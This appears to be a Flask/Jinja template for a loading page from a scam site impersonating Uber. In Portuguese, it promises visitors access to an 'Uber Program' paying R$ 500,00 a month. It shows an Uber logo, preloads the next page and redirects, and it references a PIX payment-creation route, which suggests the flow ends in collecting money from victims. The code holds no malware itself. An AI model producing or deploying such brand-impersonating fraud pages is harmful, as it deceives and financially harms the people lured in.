{% extends "layout.html" %}

{% block content %}
<style>
    body {
        overflow: hidden;
        background-color: #000 !important;
        font-family: "UberMoveText", "UberMove", system-ui, "Helvetica Neue", Helvetica, Arial, sans-serif !important;
    }

    .loading-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        background-color: #000;
        opacity: 1;
        transition: opacity 0.3s ease;
        z-index: 9999;
    }

    .uber-spinner {
        width: 60px;
        height: 60px;
        border: 3px solid #333;
        border-top: 3px solid #fff;
        border-radius: 50%;
        animation: spin 1.2s linear infinite;
        margin: 20px 0;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .fade-in {
        animation: fadeIn 0.8s ease-in;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .pulse-logo {
        animation: pulse 2s infinite;
    }

    @keyframes pulse {
        0%, 100% { opacity: 1; transform: scale(1); }
        50% { opacity: 0.8; transform: scale(1.05); }
    }

    .text-animate {
        animation: textPulse 2s infinite;
    }

    @keyframes textPulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.7; }
    }
    
    /* Force white text with maximum specificity */
    #loadingScreen * {
        color: #fff !important;
    }
</style>

<div id="loadingScreen" class="loading-screen fade-in">
    <!-- Logo Uber oficial -->
    <div class="mb-8">
        <img src="https://i.ibb.co/wFFn5HSn/13093103960002-1.png" alt="Uber" class="h-16 pulse-logo">
    </div>

    <!-- Status text -->
    <div id="loadingStatus" class="text-xl mb-4 text-center font-bold text-animate max-w-xs mx-auto" style="color: #fff !important;">
        Carregando Programa Uber...
    </div>

    <div class="text-base mb-8 text-center max-w-sm mx-auto" style="color: #fff !important;">
        Preparando seu acesso ao programa de R$ 500,00 mensais
    </div>

    <!-- Spinner Uber -->
    <div class="uber-spinner"></div>

    <div class="text-sm text-center mt-6 max-w-xs mx-auto" style="color: #fff !important;">
        <i class="fa fa-clock-o mr-2" style="color: #fff !important;"></i>
        Aguarde alguns instantes...
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        const loadingScreen = document.getElementById('loadingScreen');
        const nextPage = "{{ next_page }}";
        const minLoadingTime = {{ loading_time }};

        // Pré-carrega a próxima página e todos seus recursos
        function preloadNextPage() {
            return new Promise((resolve) => {
                // Skip preloading for payment creation routes to avoid duplicate transactions
                if (nextPage.includes('create_pix_payment')) {
                    resolve();
                    return;
                }
                
                fetch(nextPage)
                    .then(response => response.text())
                    .then(html => {
                        const tempDiv = document.createElement('div');
                        tempDiv.style.display = 'none';
                        tempDiv.innerHTML = html;
                        document.body.appendChild(tempDiv);

                        // Pré-carrega imagens
                        const images = tempDiv.getElementsByTagName('img');
                        const imagePromises = Array.from(images).map(img => {
                            return new Promise((resolveImg) => {
                                if (img.complete) {
                                    resolveImg();
                                } else {
                                    img.onload = resolveImg;
                                    img.onerror = resolveImg;
                                }
                            });
                        });

                        // Pré-carrega scripts
                        const scripts = tempDiv.getElementsByTagName('script');
                        const scriptPromises = Array.from(scripts).map(script => {
                            if (!script.src) return Promise.resolve();
                            return new Promise((resolveScript) => {
                                const newScript = document.createElement('script');
                                newScript.src = script.src;
                                newScript.onload = resolveScript;
                                newScript.onerror = resolveScript;
                                document.head.appendChild(newScript);
                            });
                        });

                        // Pré-carrega estilos
                        const styles = tempDiv.getElementsByTagName('link');
                        const stylePromises = Array.from(styles).map(style => {
                            if (style.rel !== 'stylesheet') return Promise.resolve();
                            return new Promise((resolveStyle) => {
                                const newStyle = document.createElement('link');
                                newStyle.rel = 'stylesheet';
                                newStyle.href = style.href;
                                newStyle.onload = resolveStyle;
                                newStyle.onerror = resolveStyle;
                                document.head.appendChild(newStyle);
                            });
                        });

                        // Aguarda todos os recursos carregarem
                        Promise.all([
                            ...imagePromises,
                            ...scriptPromises,
                            ...stylePromises
                        ]).then(() => {
                            document.body.removeChild(tempDiv);
                            resolve();
                        });
                    })
                    .catch(() => resolve()); // Em caso de erro, continua normalmente
            });
        }

        // Inicia o pré-carregamento imediatamente
        const preloadPromise = preloadNextPage();

        // Espera tanto o tempo mínimo quanto o pré-carregamento completo
        Promise.all([
            new Promise(resolve => setTimeout(resolve, minLoadingTime)),
            preloadPromise
        ]).then(() => {
            loadingScreen.style.opacity = '0';
            setTimeout(() => {
                window.location.href = nextPage;
            }, 300);
        });
    });
</script>
{% endblock %}
